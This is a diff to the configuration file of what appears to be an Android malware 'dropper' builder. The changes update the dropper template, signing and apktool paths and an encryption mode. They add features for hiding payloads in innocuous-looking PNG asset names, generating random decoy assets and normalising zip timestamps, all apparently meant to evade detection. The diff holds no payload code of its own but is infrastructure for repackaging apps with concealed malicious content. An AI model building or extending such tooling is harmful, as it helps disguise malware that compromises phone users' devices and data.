@@ -14,7 +14,7 @@ class Config:
     SESSION_COOKIE_SAMESITE = "Lax"
     PERMANENT_SESSION_LIFETIME = timedelta(days=30)
 
-    TEMPLATES_AUTO_RELOAD = True
+    TEMPLATES_AUTO_RELOAD = False
 
     UPLOAD_FOLDER = os.path.join(BASE_DIR, "uploads")
     OUTPUT_FOLDER = os.path.join(BASE_DIR, "outputs")
@@ -51,10 +51,11 @@ class Config:
     PUBLIC_ICONS_FOLDER = os.path.join(BASE_DIR, "outputs", "icons")
 
     DROPPER_TEMPLATE = os.path.join(BASE_DIR, "dropper_rebuild")
+    DROPPER_TEMPLATE_BACKUP_ZIP = os.path.join(BASE_DIR, "dropper_rebuild_backup.zip")
     SIGNER_JAR = os.path.join(BASE_DIR, "signer.jar")
     APKTOOL_JAR = os.path.join(BASE_DIR, "apktool.jar")
     DROPPER_LIBS_DEX = os.path.join(
-        BASE_DIR, "dropper_rebuild_legacy_stub", "prebuilt", "androidx_material.dex"
+        BASE_DIR, "dropper_rebuild", "prebuilt", "androidx_material.dex"
     )
     INJECT_SECONDARY_DEX = False
 
@@ -102,7 +103,7 @@ class Config:
     OLD_PACKAGE = "com.turbo.live"
     PACKAGE_PREFIX = "com"
 
-    CIPHER_TRANSFORM = "AES/CTR/NoPadding"
+    CIPHER_TRANSFORM = "AES/GCM/NoPadding"
     CRYPTO_XOR_FIXED = False
     CRYPTO_XOR_BYTE = 0xE7
 
@@ -120,6 +121,19 @@ class Config:
         "cache_kf.bin",
         "config_hd.db",
     )
+
+    STEGO_ASSET_NAME_POOL = (
+        "banner_art.png",
+        "splash_bg.png",
+        "ic_hero.png",
+        "promo_tile.png",
+    )
+
+    CRYPTO_CLASS_TEMPLATE = "vd"
+    DECOY_ASSET_MIN = 3
+    DECOY_ASSET_MAX = 7
+    DECOY_ASSET_SIZE_MIN = 512
+    DECOY_ASSET_SIZE_MAX = 4096
 
     ZIP_NORMALIZE_TIMESTAMPS = True
     ZIP_EPOCH_DATE_TIME = (1981, 1, 1, 1, 1, 2)
